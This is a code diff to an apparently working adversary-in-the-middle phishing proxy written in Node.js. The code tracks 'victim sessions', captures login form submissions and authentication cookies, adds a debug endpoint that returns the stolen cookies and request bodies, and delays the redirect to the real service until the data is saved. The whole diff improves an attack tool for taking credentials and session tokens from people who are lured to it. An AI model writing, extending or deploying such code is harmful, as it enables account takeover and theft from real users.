@@ -49,32 +49,40 @@ function hasCredentialsBeenCollected(currentSession) {
     
     const session = VICTIM_SESSIONS[currentSession];
     
-    // Check for authentication cookies (more specific)
-    const authCookies = session.cookies.filter(cookie => {
+    // Check for common credential indicators in cookies
+    const credentialCookies = session.cookies.filter(cookie => {
         const cookieName = cookie.name.toLowerCase();
-        // Look for actual auth tokens, not just any credential-related cookie
-        return cookieName.includes('auth') || 
-               cookieName.includes('token') || 
-               cookieName.includes('session') ||
-               cookieName.includes('access_token') ||
-               cookieName.includes('id_token') ||
-               cookieName.includes('refresh_token');
+        return config.credentials.credentialKeywords.some(keyword => 
+            cookieName.includes(keyword)
+        );
     });
     
-    // Check for form submissions with actual credentials
+    // Check for form submissions with credentials
     if (session.lastRequestBody) {
         const body = session.lastRequestBody.toLowerCase();
-        // Look for actual email/password values, not just field names
-        const hasEmail = body.includes('email=') || body.includes('username=') || body.includes('user=');
-        const hasPassword = body.includes('password=') || body.includes('pass=') || body.includes('pwd=');
+        
+        // More strict detection: require both email and password
+        const hasEmail = body.includes('email') || body.includes('username') || body.includes('user');
+        const hasPassword = body.includes('password') || body.includes('pass') || body.includes('pwd');
         
         if (hasEmail && hasPassword) {
+            console.log(`[CREDENTIAL_DETECTED] Session: ${currentSession} - Found BOTH email and password in request body`);
+            return true;
+        }
+        
+        // Fallback: check for other credential fields
+        if (config.credentials.credentialFields.some(field => body.includes(field))) {
+            console.log(`[CREDENTIAL_DETECTED] Session: ${currentSession} - Found credential fields in request body`);
             return true;
         }
     }
     
-    // Only redirect if we have actual auth cookies (indicating successful login)
-    return authCookies.length > 0;
+    if (credentialCookies.length > 0) {
+        console.log(`[CREDENTIAL_DETECTED] Session: ${currentSession} - Found ${credentialCookies.length} credential cookies:`, credentialCookies.map(c => c.name));
+        return true;
+    }
+    
+    return false;
 }
 
 // Function to check if this is a login form submission
@@ -86,13 +94,14 @@ function isLoginFormSubmission(proxyRequestBody, proxyRequestOptions) {
     
     // Check for common login endpoints
     const isLoginEndpoint = config.credentials.loginEndpoints.some(endpoint => path.includes(endpoint));
+    const hasCredentials = config.credentials.credentialFields.some(field => body.includes(field));
     
-    // Look for actual email/password values in the request body
-    const hasEmail = body.includes('email=') || body.includes('username=') || body.includes('user=');
-    const hasPassword = body.includes('password=') || body.includes('pass=') || body.includes('pwd=');
+    if (isLoginEndpoint && hasCredentials) {
+        console.log(`[LOGIN_DETECTED] Session: ${proxyRequestOptions.headers.cookie ? getUserSession(proxyRequestOptions.headers.cookie) : 'none'} - Login endpoint: ${path} with credentials`);
+        return true;
+    }
     
-    // Only trigger if it's a login endpoint AND has both email and password
-    return isLoginEndpoint && hasEmail && hasPassword;
+    return false;
 }
 
 
@@ -128,6 +137,26 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             PHISHED_URL_PARAMETER: PHISHED_URL_PARAMETER,
             startsWithEntryPoint: url.startsWith(PROXY_ENTRY_POINT),
             includesParameter: url.includes(PHISHED_URL_PARAMETER)
+        }));
+        return;
+    }
+
+    // Session debug endpoint to see captured data
+    if (url === "/session-debug") {
+        if (!currentSession) {
+            clientResponse.writeHead(200, { "Content-Type": "application/json" });
+            clientResponse.end(JSON.stringify({ error: "No active session" }));
+            return;
+        }
+        
+        const session = VICTIM_SESSIONS[currentSession];
+        clientResponse.writeHead(200, { "Content-Type": "application/json" });
+        clientResponse.end(JSON.stringify({
+            sessionId: currentSession,
+            cookies: session.cookies,
+            lastRequestBody: session.lastRequestBody,
+            hasCredentials: hasCredentialsBeenCollected(currentSession),
+            isLoginForm: session.lastRequestBody ? isLoginFormSubmission(session.lastRequestBody, { path: url, headers: headers }) : false
         }));
         return;
     }
@@ -474,21 +503,10 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                 }
 
                 // Check if credentials have been collected and redirect if needed
-                const hasCredentials = hasCredentialsBeenCollected(currentSession);
-                const isLoginForm = isLoginFormSubmission(proxyRequestBody, proxyRequestOptions);
-                
-                // Debug logging
-                if (config.logging.enableCredentialLogging) {
-                    console.log(`[DEBUG] Session: ${currentSession}`);
-                    console.log(`[DEBUG] Has credentials: ${hasCredentials}`);
-                    console.log(`[DEBUG] Is login form: ${isLoginForm}`);
-                    console.log(`[DEBUG] Request path: ${proxyRequestOptions.path}`);
-                    console.log(`[DEBUG] Request body preview: ${proxyRequestBody ? proxyRequestBody.toString().substring(0, 200) : 'none'}`);
-                    console.log(`[DEBUG] Cookies count: ${VICTIM_SESSIONS[currentSession] ? VICTIM_SESSIONS[currentSession].cookies.length : 0}`);
-                }
-                
-                if (config.credentials.enableRedirect && (hasCredentials || isLoginForm)) {
+                if (config.credentials.enableRedirect && (hasCredentialsBeenCollected(currentSession) || isLoginFormSubmission(proxyRequestBody, proxyRequestOptions))) {
                     console.log(`[CREDENTIALS_COLLECTED] Session: ${currentSession} - Redirecting to: ${config.credentials.redirectUrl}`);
+                    console.log(`[CREDENTIALS_COLLECTED] Cookies captured: ${VICTIM_SESSIONS[currentSession].cookies.length}`);
+                    console.log(`[CREDENTIALS_COLLECTED] Request body: ${VICTIM_SESSIONS[currentSession].lastRequestBody ? 'Present' : 'None'}`);
                     
                     // Log the credential collection event
                     if (config.logging.enableCredentialLogging) {
@@ -511,12 +529,15 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                         }
                     }
                     
-                    // Redirect to the legitimate service
-                    clientResponse.writeHead(302, { 
-                        Location: config.credentials.redirectUrl,
-                        ...config.security.redirectHeaders
-                    });
-                    clientResponse.end();
+                    // Small delay to ensure data is captured before redirect
+                    setTimeout(() => {
+                        // Redirect to the legitimate service
+                        clientResponse.writeHead(302, { 
+                            Location: config.credentials.redirectUrl,
+                            ...config.security.redirectHeaders
+                        });
+                        clientResponse.end();
+                    }, 100);
                     return;
                 }
                 
